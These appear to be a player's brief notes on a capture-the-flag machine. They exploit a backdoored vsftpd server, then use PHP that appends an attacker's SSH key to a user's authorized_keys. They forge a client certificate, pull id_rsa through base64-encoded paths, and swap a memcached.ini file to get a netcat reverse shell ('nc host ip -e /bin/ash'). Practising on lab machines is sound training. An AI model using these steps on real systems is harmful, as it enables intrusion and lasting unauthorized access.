```
1- Nmap
2- Search for FTP version vulnerability got this: https://www.hackingtutorials.org/metasploit-tutorials/exploiting-vsftpd-metasploitable/

Triggered Backdoor.


$txt = "ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQC7Rg+ZdjVgi92a/yxXJ3PaHw8EEFA/WSkZTfDquxJjK8pUr0vVeyjX7DbrudsdvHha3jea9dzMNQ6hLNVuVAqB+nI7ZFPKW1giFVp2OTCzIv1Axsz6kNiDvg0g9BcCO+YbCzTJDy9rw00U8UTdTEbHqs7MUXWWH647/U3MLyCQfR69UTGwq49QBKE2LJckH+y15GEV+fPH83bTLBX6NMvbLQMv8gyYQg2h/Jm6yjyHSjNC66TvYs7xlXxowyADZ8zXL/tduSxs5VHwnlJ9kCFZx8TgaG2ePifjYF4oHIokarYPCEu2+XDh1BTboScl/fUBBFYlYTkbRB0OETmOkGGf "

$myfile = file_put_contents('/home/dali/.ssh/authorized_keys', $txt.PHP_EOL , FILE_APPEND | LOCK_EX);

Openssl s_client -connect ip:443  (to get public key .crt file)(there is something like this ----beegin certificate---, ---end certificate---).
openssl pkcs12 -export -in /root/ca.crt(publicKey) -inkey /root/ca.key -out /root/lacasadepapel.p12

Look at the file inside SEASON1-/1.avi there link is base64 encoded, so do same for id_rsa and user.txt

now you think that id_rsa is for berlin but it is not it is for professor. :-)

then there is memcached.ini file rename it to something and create your memcached.ini file and wait for the reverse shell.

nc host ip -e /bin/ash
nc -lvp 5546
```
